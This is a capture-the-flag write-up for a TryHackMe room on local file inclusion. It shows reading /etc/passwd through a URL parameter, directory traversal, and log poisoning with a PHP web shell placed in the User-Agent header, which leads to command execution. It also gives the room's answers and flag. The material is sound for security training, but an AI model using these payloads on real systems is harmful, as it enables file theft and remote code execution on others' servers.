---
title: Write-Up [THM] LFI Basics
template: "post"
date: "2020-08-28"
draft: false
category: "Write-Ups, TryHackMe"
tags:
  - "TryHackMe"
  - "LFI"
social-image: "/media/thm/lfiBasics/theme.png"
description: "It's a write-up about the room : [Try Hack Me - Room : LFI Basics](https://tryhackme.com/room/lfibasics)"
---

It's a write-up about the room : [Try Hack Me - Room : LFI Basics](https://tryhackme.com/room/lfibasics)

# [Task 1] - Local File Inclusion

* What's the message you get when you include the home.html?

We went on `http://ip_machine/lfi/lfi.php/?page=home.html` and the message was **You included home.html**.

* What user that it's not by default there is present?

We read the passwd file : `http://ip_machine/lfi/lfi.php/?page=/etc/passwd` and found the user **lfi**.

# [Task 2] - Local File Inclusion using Directory Traversal

* Add the "?page=" parameter, and try to include the home page again. Does it work (Yes/No)? **No** 

* What are the credit card numbers ? 

`http://ip_machine/lfi2/lfi.php/?page=../creditcard` and found **1111-2222-3333-4444**.

# [Task 3] - Reaching RCE using LFI and log poisoning

`http://ip_machine/lfi/lfi.php/?page=/var/log/apache2/access.log`

* Can you read the log (Yes/No)? **Yes**

* Give it a try and run uname -r. What's the output of the command?

`http://ip_machine/lfi/lfi.php?page=/var/log/apache2/access.log&lfi= uname -r`

With BurpSuite, we changed the User-Agent :  
`Mozilla/5.0 <?php system($_GET['lfi']); ?> Firefox/79.0`.   

And after that we send with the repeater : `http://<IP>/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=uname%20-r`.  
The answer is : `4.15.0-72-generic`

* With this knowledge read the flag from the lfi user home directory.

To begin we searched what file can contained the flag with the command ls in the lfi user home directory : `GET /lfi/lfi.php?page=/var/log/apache2/access.log&lfi=ls%20../../../../../../home/lfi/`

We found :
```
Documents
Downloads
Music
Pictures
Public
Templates
Videos
flag.txt
```

Therefore we read the content of the file flag.txt : 
`GET /lfi/lfi.php?page=/var/log/apache2/access.log&lfi=cat%20../../../../../../home/lfi/flag.txt`.  

We found the last flag : **THM{a352a5c2acfd22251c3a94105b718fea}**.